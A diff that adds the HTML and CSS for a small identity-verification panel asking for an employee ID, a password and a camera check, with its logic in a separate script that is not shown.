@@ -1,0 +1,71 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Identity Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #111827;
+      color: #fff;
+      width: 360px;
+      margin: 0;
+      padding: 24px;
+      box-sizing: border-box;
+    }
+
+    h2 { margin-top: 0; }
+    label { display: block; margin-top: 14px; }
+    input, button {
+      width: 100%;
+      box-sizing: border-box;
+      padding: 11px;
+      margin-top: 7px;
+      border-radius: 7px;
+      border: 1px solid #4b5563;
+    }
+
+    input { background: #1f2937; color: #fff; }
+    button {
+      background: #2563eb;
+      color: white;
+      border: 0;
+      cursor: pointer;
+      margin-top: 16px;
+    }
+
+    button:disabled { opacity: 0.5; cursor: wait; }
+    video {
+      width: 100%;
+      margin-top: 14px;
+      background: #000;
+      border-radius: 8px;
+    }
+
+    #status { color: #fbbf24; font-size: 13px; }
+  </style>
+</head>
+<body>
+  <h2>🔐 Verify your identity</h2>
+  <p>Verify before proceeding to the protected website.</p>
+
+  <form id="verification-form">
+    <label for="employee-id">Employee ID</label>
+    <input id="employee-id" required autocomplete="username">
+
+    <label for="password">Employee password</label>
+    <input id="password" type="password" required
+           autocomplete="current-password">
+
+    <button type="button" id="start-camera">Start camera</button>
+    <video id="camera" autoplay playsinline muted></video>
+
+    <button type="submit" id="verify-button">Verify and continue</button>
+  </form>
+
+  <p id="status" role="status">Camera not started.</p>
+  <script src="verify.js"></script>
+</body>
+</html>
